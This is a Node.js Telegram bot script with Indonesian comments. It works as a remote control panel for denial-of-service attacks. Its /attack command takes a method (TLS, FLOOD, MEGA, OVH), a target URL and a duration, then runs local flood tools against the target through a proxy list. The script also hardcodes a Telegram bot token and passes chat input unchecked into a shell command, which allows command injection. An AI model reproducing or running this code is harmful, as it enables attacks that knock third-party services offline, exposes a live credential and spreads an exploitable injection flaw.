const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');

// Ganti dengan token botmu
const token = '6956257395:AAGoIMLKkzWqLMgGda2dN0fVRhzpf8A2HFU';

// Inisialisasi bot
const bot = new TelegramBot(token, { polling: true });

// Menangani perintah /help
bot.onText(/\/help/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 'Daftar perintah:\n/Method\nLAYER 7\nTLS\nFLOOD\nMEGA\n\nLAYER 4\nOVH');
});

// Menangani perintah /Method
bot.onText(/\/Method/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 'Pilihan metode:\nLAYER 7\nTLS\nFLOOD\nMEGA\n\nLAYER 4\nOVH');
});

// Menangani perintah /attack
bot.onText(/\/attack (.+) (.+) (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const method = match[1];
  const url = match[2];
  const time = match[3];

  let command;
  if (method === 'OVH') {
    command = `./OVH ${url} ${time}`;
  } else {
    command = `node ${method}.js ${url} ${time} 9 8 proxy.txt`;
  }

  exec(command, (error, stdout, stderr) => {
    if (error) {
      console.error(`exec error: ${error}`);
      return;
    }
    bot.sendMessage(chatId, `Attack sent to ${url} for ${time} seconds`);
  });
});

// Menangani perintah tidak dikenal
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 'Perintah tidak dikenal, gunakan /help untuk melihat daftar perintah.');
});